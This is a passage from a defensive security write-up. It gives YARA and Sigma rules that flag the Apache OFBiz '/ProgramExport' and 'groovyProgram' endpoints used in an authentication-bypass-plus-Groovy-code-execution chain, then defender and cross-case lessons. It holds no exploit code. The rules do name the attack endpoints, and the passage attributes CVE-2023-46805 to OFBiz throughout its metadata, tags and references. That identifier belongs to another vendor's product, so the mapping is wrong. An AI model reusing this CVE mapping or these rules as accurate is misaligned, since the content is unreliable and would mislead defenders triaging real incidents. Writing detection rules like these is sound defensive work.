rule CVE_2023_46805_CVE_2024_45507_ofbiz_chain {
    meta:
        description = "OFBiz auth bypass + Groovy RCE chain (CVE-2023-46805 + CVE-2024-45507)"
        cve         = "CVE-2023-46805+CVE-2024-45507"
    strings:
        $program_export = "ProgramExport"
        $groovy_program = "groovyProgram"
    condition:
        any of them
}
```

Sigma (HTTP telemetry):

```yaml
title: CVE-2023-46805 + CVE-2024-45507 OFBiz — ProgramExport Accessed
id: d0e1f2a3-b4c5-4d6e-7f80-901020304050
status: experimental
description: Detects exploitation of OFBiz auth bypass + Groovy RCE chain.
logsource:
    product: apache
    service: ofbiz_access
detection:
    selection:
        cs-uri-query|contains:
            - '/ProgramExport'
            - 'groovyProgram'
    condition: selection
falsepositives: [Legitimate ERP admin scripts (rare)]
level: critical
tags: [attack.initial_access, attack.t1190, cve.2023.46805, cve.2024.45507]
```

### Defender Lessons

1. **Chained CVEs are the rule, not the exception** — auth bypass + code exec is the canonical mass-exploitation pattern
2. **WAF rules on `/ProgramExport`** — even with patch, defense in depth matters
3. **ERP systems are high-value targets** — OFBiz has been hit repeatedly (CVE-2020-9496, CVE-2023-46805, CVE-2024-45507)

### References

- https://ofbiz.apache.org/security.html
- SonicWall — CVE-2023-46805 writeup
- Rapid7 — mass exploitation telemetry

---

## Cross-Case Lessons

Across the 10 cases:

1. **Bug-class taxonomy drives Phase 3 strategy** — memory_corruption → fuzzer; auth_bypass/sqli → manual HTTP
2. **Differential verification is universally applicable** — every case has a vuln-vs-patched stop condition
3. **YARA source + binary patterns are complementary** — source catches dev-time, binary catches deployment-time
4. **Sigma telemetry differs by bug class** — memory_corruption = process load; auth_bypass = HTTP request; race = syslog
5. **CyberGym-style stop condition is universal** — `vulnerable.crashed == true AND patched.crashed == false` applies to every class (for non-memory bugs, "crash" = unexpected response)
6. **Patch-gapping is the dominant in-the-wild pattern** — every case here was exploited in the wild within days of disclosure
7. **Defense in depth matters** — every case demonstrates that compiler flags, SBOM, YARA, and Sigma together reduce mean-time-to-detect from weeks to hours

## Further Reading

- Project Zero — "Patch Gapping" methodology
- Mandiant — vulnerability research blog
- Google TAG — in-the-wild exploitation telemetry
- Microsoft MSRC — Patch Tuesday diffs
- CrowdStrike — reverse engineering reports
- SigmaHQ — public Sigma rule corpus
- CyberGym paper (ICLR 2026) — benchmark methodology
